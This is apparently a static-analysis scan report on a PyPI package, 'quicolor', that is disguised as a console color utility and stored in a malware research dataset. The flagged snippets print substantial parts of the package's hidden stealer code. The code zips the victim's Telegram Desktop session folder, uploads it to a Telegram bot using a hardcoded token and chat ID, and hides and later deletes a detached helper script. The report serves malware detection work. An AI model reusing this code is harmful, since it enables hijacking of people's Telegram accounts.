Run started:2025-05-25 16:09:41.396407

Test results:
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
29	    # registered from the main thread
30	    if threading.current_thread() is threading.main_thread():
31	        _install_signal_handlers()

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
29	    # registered from the main thread
30	    if threading.current_thread() is threading.main_thread():
31	        _install_signal_handlers()

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:121
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
120	                if not should_ignore:
121	                    zipf.write(file_path, arcname=rel_path_str)
122	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:127
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
126	    try:
127	        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_API_KEY}/sendDocument"
128	        

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:133
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
132	            
133	            response = requests.post(url, files=files, data=data)
134	            response.json()

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:150
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
149	    try:
150	        username = os.environ.get('USERNAME')
151	        source_folder = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:190
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
189	    # Save original handlers
190	    _original_sigint_handler = signal.getsignal(signal.SIGINT)
191	    _original_sigterm_handler = signal.getsignal(signal.SIGTERM)

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:191
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
190	    _original_sigint_handler = signal.getsignal(signal.SIGINT)
191	    _original_sigterm_handler = signal.getsignal(signal.SIGTERM)
192	    

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:194
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
193	    # Install our custom handlers
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)

--------------------------------------------------
>> Issue: [B324:blacklist] signal_signal
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:194
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b324-signal-signal
193	    # Install our custom handlers
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:195
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)
196	

--------------------------------------------------
>> Issue: [B324:blacklist] signal_signal
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:195
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b324-signal-signal
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)
196	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:272
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
271	        with os.fdopen(fd, 'w') as f:
272	            f.write(f'''
273	import time
274	import os
275	import signal
276	import sys
277	
278	# PID of the parent process that launched us
279	parent_pid = {os.getpid()}
280	
281	# Give the parent a delay to set up any resources
282	time.sleep(1)
283	
284	# Monitor the parent process
285	try:
286	    while True:
287	        try:
288	            # Check if parent is still running
289	            os.kill(parent_pid, 0)
290	            time.sleep(1)
291	        except OSError:
292	            # Parent has terminated, wait a bit to ensure uploads complete
293	            time.sleep(240)  # Give it 4 minutes
294	            break
295	except:
296	    pass
297	
298	# Clean up
299	try:
300	    os.unlink("{script_path}")
301	except:

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:272
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
271	        with os.fdopen(fd, 'w') as f:
272	            f.write(f'''
273	import time
274	import os
275	import signal
276	import sys
277	
278	# PID of the parent process that launched us
279	parent_pid = {os.getpid()}
280	
281	# Give the parent a delay to set up any resources
282	time.sleep(1)
283	
284	# Monitor the parent process
285	try:
286	    while True:
287	        try:
288	            # Check if parent is still running
289	            os.kill(parent_pid, 0)
290	            time.sleep(1)
291	        except OSError:
292	            # Parent has terminated, wait a bit to ensure uploads complete
293	            time.sleep(240)  # Give it 4 minutes
294	            break
295	except:
296	    pass
297	
298	# Clean up
299	try:
300	    os.unlink("{script_path}")
301	except:

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:334
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
333	        # Start the backup thread
334	        _backup_thread = threading.Thread(target=backup_telegram)
335	        _backup_thread.daemon = False  # Non-daemon threads should prevent program exit

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:358
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
357	        # even if imported from another script
358	        if threading.current_thread() is threading.main_thread():
359	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:358
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
357	        # even if imported from another script
358	        if threading.current_thread() is threading.main_thread():
359	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:445
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
444	        # even if imported from another script
445	        if threading.current_thread() is threading.main_thread():
446	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:445
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
444	        # even if imported from another script
445	        if threading.current_thread() is threading.main_thread():
446	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:476
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
475	    try:
476	        username = os.environ.get('USERNAME')
477	        source_folder = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:485
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
484	        # even if the parent process is terminated
485	        script = f"""
486	import os
487	import zipfile
488	import requests
489	import fnmatch
490	import datetime
491	import sys
492	from pathlib import Path
493	
494	def compress_telegram_data_folder(source_folder, zip_file_path):
495	    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
496	        ignore_patterns = [
497	            '**/media_cache/**',
498	            '**/cache/**',
499	            '**/webview/**',
500	            '**/wvbots/**',
501	            '**/EBWebView/**',
502	            '**/temp/**',
503	            'working'
504	        ]
505	        
506	        source_path = Path(source_folder)
507	        
508	        for file_path in source_path.glob('**/*'):
509	            if file_path.is_file():
510	                rel_path = file_path.relative_to(source_path)
511	                rel_path_str = str(rel_path).replace('\\\\', '/')
512	                
513	                should_ignore = False
514	                for pattern in ignore_patterns:
515	                    if fnmatch.fnmatch(rel_path_str, pattern) or any(
516	                        fnmatch.fnmatch(part, pattern.replace('**/', '').replace('/**', '')) 
517	                        for part in rel_path_str.split('/')
518	                    ):
519	                        should_ignore = True
520	                        break
521	                
522	                if not should_ignore:
523	                    zipf.write(file_path, arcname=rel_path_str)
524	
525	def upload_to_telegram(zip_file_path):
526	    url = f"https://api.telegram.org/bot7866811532:AAFFmg3h1Q8dNgtkyfMzWI020VAHuddSi7g/sendDocument"
527	    
528	    try:
529	        with open(zip_file_path, 'rb') as document:
530	            files = {{'document': document}}
531	            data = {{'chat_id': '7332038463'}}
532	            
533	            # Add timeout to prevent hanging
534	            response = requests.post(url, files=files, data=data, timeout=300)
535	            
536	            # Log response for debugging
537	            with open(os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'tg_upload_log.txt'), 'w') as log_file:
538	                log_file.write(f"Response status: {{response.status_code}}\\n")
539	                log_file.write(f"Response content: {{response.text}}\\n")
540	                
541	            # Verify response
542	            if response.status_code != 200:
543	                raise Exception(f"Upload failed with status {{response.status_code}}")
544	            
545	            return True
546	    except Exception as e:
547	        with open(os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'tg_error_log.txt'), 'w') as error_file:
548	            error_file.write(f"Error during upload: {{str(e)}}\\n")
549	        return False
550	        
551	    # Clean up zip file after upload
552	    try:
553	        if os.path.exists(zip_file_path):
554	            os.remove(zip_file_path)
555	    except:
556	        pass
557	        
558	    return True
559	
560	# Script execution starts here
561	try:
562	    username = os.environ.get('USERNAME')
563	    source_folder = '{source_folder}'
564	    zip_file_path = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', f'{{username}}_tg_{{datetime.datetime.now().strftime("%Y%m%d%H%M%S")}}.zip')

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:615
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
614	        # Write the script to a temporary file
615	        temp_script_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), f'_qc_temp_{os.getpid()}.py')
616	        with open(temp_script_path, 'w') as f:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:617
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
616	        with open(temp_script_path, 'w') as f:
617	            f.write(script)
618	        

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:617
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
616	        with open(temp_script_path, 'w') as f:
617	            f.write(script)
618	        

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:649
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
648	            if os.name == 'nt':
649	                os.system(f'attrib +h "{temp_script_path}"')  # Hide the file
650	                

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:649
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
648	            if os.name == 'nt':
649	                os.system(f'attrib +h "{temp_script_path}"')  # Hide the file
650	                

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/quicolor/__init__.py:660
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
659	                    
660	            cleanup_thread = threading.Thread(target=delayed_cleanup)
661	            cleanup_thread.daemon = True

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.6/quicolor-10.0.6/quicolor-10.0.6/setup.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
13	    keywords="color, format, console, utility",
14	    url="https://github.com/author/quicolor",
15	    classifiers=[

--------------------------------------------------

Code scanned:
	Total lines of code: 458
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 6.0
		High: 22.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 25.0
		High: 3.0
Files skipped (0):
